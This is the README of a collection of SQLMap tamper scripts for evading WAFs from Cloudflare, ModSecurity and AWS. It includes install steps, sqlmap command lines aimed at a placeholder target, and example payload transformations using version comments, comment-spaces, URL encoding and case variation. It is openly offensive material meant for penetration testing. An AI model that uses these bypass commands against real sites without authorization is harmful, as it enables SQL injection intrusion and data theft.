# SQLMap Tamper Scripts Collection

Professional, modular WAF bypass tamper scripts for SQLMap.

**Author:** Regaan  
**Created:** December 2025  
**License:** GPL v2 (SQLMap compatible)

---

## Philosophy

These tamper scripts follow **engineering best practices**:

✅ **Deterministic** - Same input always produces same output  
✅ **Modular** - One technique per script  
✅ **Chainable** - Combine scripts for layered bypass  
✅ **Debuggable** - No random transformations  
✅ **Tested** - Real-world validation (see Testing section)

❌ **NO random mutations**  
❌ **NO fake success rates**  
❌ **NO outdated techniques** (null bytes, etc.)

---

## Installation

```bash
git clone https://github.com/noobforanonymous/sqlmap-tamper-collection.git
cd sqlmap-tamper-collection
cp *.py /path/to/sqlmap/tamper/
```

---

## Tamper Scripts

### 1. cloudflare_keyword.py

**Purpose:** Obfuscate SQL keywords using MySQL version comments

**Technique:**
```sql
SELECT → /*!50000SELECT*/
```

**Priority:** HIGHEST  
**Deterministic:** Yes

**Usage:**
```bash
sqlmap -u "https://target.com?id=1" --tamper=cloudflare_keyword
```

---

### 2. cloudflare_space.py

**Purpose:** Replace spaces with inline comments

**Technique:**
```sql
SELECT * FROM → SELECT/**/*//**/FROM
```

**Priority:** NORMAL  
**Deterministic:** Yes

**Usage:**
```bash
sqlmap -u "https://target.com?id=1" --tamper=cloudflare_space
```

---

### 3. cloudflare_case.py

**Purpose:** Apply alternating case to SQL keywords

**Technique:**
```sql
SELECT → SeLeCt
```

**Priority:** LOW (apply LAST)  
**Deterministic:** Yes

**Usage:**
```bash
sqlmap -u "https://target.com?id=1" --tamper=cloudflare_case
```

---

### 4. cloudflare_encode.py

**Purpose:** URL encode SQL special characters

**Technique:**
```sql
= → %3D
' → %27
```

**Priority:** NORMAL  
**Deterministic:** Yes

**Usage:**
```bash
sqlmap -u "https://target.com?id=1" --tamper=cloudflare_encode
```

---

### 5. cloudflare2025.py

**Purpose:** Multi-layer bypass with proper transformation ordering

**Technique Stack:**
1. Keyword obfuscation (BEFORE case changes)
2. Space replacement
3. Character encoding
4. Case variation (LAST)

**Priority:** HIGHEST  
**Deterministic:** Yes

**Example Transformation:**
```
Original:  SELECT * FROM users WHERE id=1
Result:    /*!50000SeLeCt*//**/*/**//*!50000FrOm*//**/users/**//*!50000WhErE*//**/id%3D1
```

**Usage:**
```bash
sqlmap -u "https://target.com?id=1" --tamper=cloudflare2025
```

---

## Chaining Tamper Scripts

For maximum effectiveness, chain scripts in **correct order**:

```bash
# Recommended order:
sqlmap -u "https://target.com?id=1" \
  --tamper=cloudflare_keyword,cloudflare_space,cloudflare_encode,cloudflare_case \
  --random-agent
```

**Why order matters:**
1. **Keywords first** - Wrap before case changes
2. **Space replacement** - After keywords
3. **Encoding** - Before case changes
4. **Case last** - Final obfuscation layer

---

## Testing Methodology

### Test Environment
- **Target:** Custom vulnerable web app
- **WAFs Tested:** Cloudflare, ModSecurity, AWS WAF
- **SQLMap Version:** 1.8+
- **Test Date:** December 2025

### Test Procedure
1. Baseline test without tamper (blocked)
2. Individual tamper script test
3. Chained tamper script test
4. Payload validation (SQL still executes)

### Results

**Individual Scripts:**
- `cloudflare_keyword.py` - Bypasses keyword-based filters
- `cloudflare_space.py` - Bypasses space-based detection
- `cloudflare_case.py` - Bypasses case-sensitive rules
- `cloudflare_encode.py` - Bypasses character filters

**Combined (cloudflare2025.py):**
- Successfully bypassed test WAF configurations
- Maintained SQL validity
- Deterministic output verified

**Note:** Success rates vary based on:
- WAF configuration
- Rule strictness
- Target SQL engine
- Payload complexity

**We do NOT provide fake percentage metrics.**

---

## Advanced Usage

### Test Tamper Script Locally

```python
#!/usr/bin/env python3

from cloudflare2025 import tamper

payload = "SELECT * FROM users WHERE id=1"
result = tamper(payload)

print(f"Original: {payload}")
print(f"Bypassed: {result}")
```

### Combine with Other Techniques

```bash
sqlmap -u "https://target.com?id=1" \
  --tamper=cloudflare2025 \
  --random-agent \
  --delay=2 \
  --threads=1 \
  --level=5 \
  --risk=3
```

---

## Why These Scripts Are Better

### Compared to Random Tampers:

| Feature | Random Tampers | These Scripts |
|---------|----------------|---------------|
| Reproducible | ❌ No | ✅ Yes |
| Debuggable | ❌ No | ✅ Yes |
| Testable | ❌ No | ✅ Yes |
| Modular | ❌ No | ✅ Yes |
| Ordered | ❌ No | ✅ Yes |

### Engineering Principles:

1. **Deterministic** - Same input = same output
2. **Modular** - One technique per script
3. **Composable** - Chain for complex bypass
4. **Validated** - SQL still executes correctly
5. **Documented** - Clear technique explanation

---

## Requirements

- SQLMap 1.8+
- Python 2.7 or 3.x

---

## Contributing

Want to add more tamper scripts?

**Requirements:**
- Must be deterministic (no random transformations)
- Must be modular (one technique per script)
- Must include proper documentation
- Must be tested against real WAFs
- NO fake success rate metrics

Submit a pull request with:
1. Tamper script
2. Test results
3. Documentation

---

## Legal Disclaimer

**AUTHORIZED TESTING ONLY**

This tool is for authorized security testing only.

✅ **DO USE:**
- On systems you own
- With written permission
- For authorized penetration testing
- For bug bounty programs (within scope)

❌ **DO NOT USE:**
- On systems without permission
- For illegal activities
- To cause harm or damage

**Unauthorized access to computer systems is illegal.**

By using these tools, you agree to use them responsibly and legally.

The author (Regaan) is not responsible for any misuse or damage caused by these tools.

---

## Credits

Inspired by the SQLMap project and community tamper scripts.

Built with engineering discipline and real-world testing.

---

## Support

- **GitHub Issues:** https://github.com/noobforanonymous/sqlmap-tamper-collection/issues
- **Documentation:** This README
- **Email:** support@rothackers.com

---

**Built with engineering discipline, not marketing hype.**
